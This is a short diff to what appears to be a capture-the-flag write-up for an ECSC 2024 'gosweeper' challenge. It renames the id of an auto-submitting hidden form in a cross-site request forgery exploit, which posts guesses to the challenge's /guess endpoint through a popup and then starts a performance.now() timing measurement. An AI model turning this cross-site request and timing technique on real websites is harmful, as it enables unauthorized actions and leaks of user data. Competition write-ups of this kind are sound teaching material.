@@ -386,7 +386,7 @@ Here is the exploit:
 			<form
 			method="POST"
 			action="https://gosweeper.challs.open.ecsc2024.it/guess"
-			id="csrf-form"
+			id="form"
 			target="popup">
 
 			<input type="hidden" name="guess" id="to_guess" value="7" />
@@ -409,7 +409,7 @@ Here is the exploit:
 		var limit = 600;
 
 		var b = window.open("about:blank", "popup", "width=300, height=300");
-		document.forms["csrf-form"].submit();
+		document.forms["form"].submit();
 		
 		setTimeout(() => {
 			var t = performance.now();
